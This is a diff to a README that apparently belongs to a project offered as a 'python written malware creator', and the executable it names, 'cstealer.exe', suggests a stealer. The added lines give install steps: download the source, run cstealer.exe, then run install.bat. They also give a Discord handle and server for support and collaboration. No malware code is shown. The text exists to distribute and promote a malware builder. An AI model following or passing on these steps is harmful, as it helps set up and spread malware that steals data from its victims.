@@ -1,9 +1,13 @@
 ![python written malware creator](https://camo.githubusercontent.com/29c82d78dcf37a87eaf04dfe280074af8ef5e4b0579f37ddb7089471209dcd20/68747470733a2f2f692e68697a6c69726573696d2e636f6d2f3939387a7879762e706e67)
 
-
+# install
  
  
- 
+ Download source code first
+ make sure you have python installed
+then run cstealer.exe
+then run install.bat
+my discord is crystalller dm me for support or to collaborate
 
 Discord server join for more creators: https://discord.gg/KgGN5jTCdF
 🔱 Join Discord for support and contact 🔱
